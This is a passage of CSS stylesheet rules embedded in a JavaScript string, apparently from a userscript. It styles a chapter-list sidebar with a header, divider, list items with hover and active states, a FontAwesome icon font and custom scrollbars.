        border-top: 1px solid rgba(0,0,0,0.3);\
        background: #404040;\
        box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);\
        text-shadow: 0 1px 0 rgba(0,0,0,0.5);\
        padding: 10px 12px;\
        text-transform: uppercase;\
        font-weight: bold;\
        font-size: 20px;\
    }\
    #header a {\
        color: #777777;\
    }\
    #divider {\
        position: relative;\
        z-index: 300;\
        border-top: 1px solid rgba(255,255,255,0.01);\
        border-bottom: 1px solid rgba(0,0,0,0.3);\
        margin: 0;\
        height: 4px;\
        background: rgba(0,0,0,0.2);\
        box-shadow: 0 1px 0 rgba(255,255,255,0.05), inset 0 1px 3px rgba(0,0,0,0.3);\
    }\
    #chapter-list {\
        position: absolute;\
        top: 46px;\
        bottom: 0;\
        left: 0;\
        right: 0;\
        z-index: 200;\
        margin: 0;\
        padding: 0;\
        cursor: pointer;\
        list-style: none;\
        overflow-y: auto;\
    }\
    .chapter {\
        list-style: none;\
    }\
    .chapter:last-child {\
        border-bottom: 1px solid rgba(0,0,0,0.3);\
        box-shadow: 0 1px 0 rgba(255,255,255,0.05);\
    }\
    .chapter div {\
        color: #ccc;\
        font-size: 15px;\
        padding: 8px 20px;\
        border-top: 1px solid rgba(0,0,0,0.3);\
        box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);\
        text-shadow: 0 1px 0 rgba(0,0,0,0.5);\
        display: block;\
        text-decoration: none;\
        text-overflow: ellipsis;\
        overflow: hidden;\
        white-space: nowrap;\
        cursor: pointer;\
    }\
    .chapter div:before {\
        content: "\\f105";\
        width: 20px;\
        margin-left: -10px;\
        float: left;\
        font-family: "FontAwesome";\
        text-align: center;\
    }\
    .chapter div:hover {\
        background: #404040;\
        color: #fff;\
        outline: 0;\
    }\
    .chapter.active div {\
        background: #1a1a1a;\
        color: #fff;\
        font-size: 16px;\
        box-shadow: inset 0 1px 3px rgba(0,0,0,0.3);\
    }\
    @font-face {\
        font-family: "FontAwesome";\
        src: url(' + fontawesomeWoff + ');\
        font-weight: normal;\
        font-style: normal;\
    }\
    ::-webkit-scrollbar {\
        height: 9px !important;\
        width: 9px !important;\
    }\
    ::-webkit-scrollbar-thumb {\
        background-color: #7D7D7D !important;\
        border-radius: 3px !important;\
    }\
    ::-webkit-scrollbar-track-piece {\
        background-color: rgba(0,0,0,.25) !important;\
    }\
');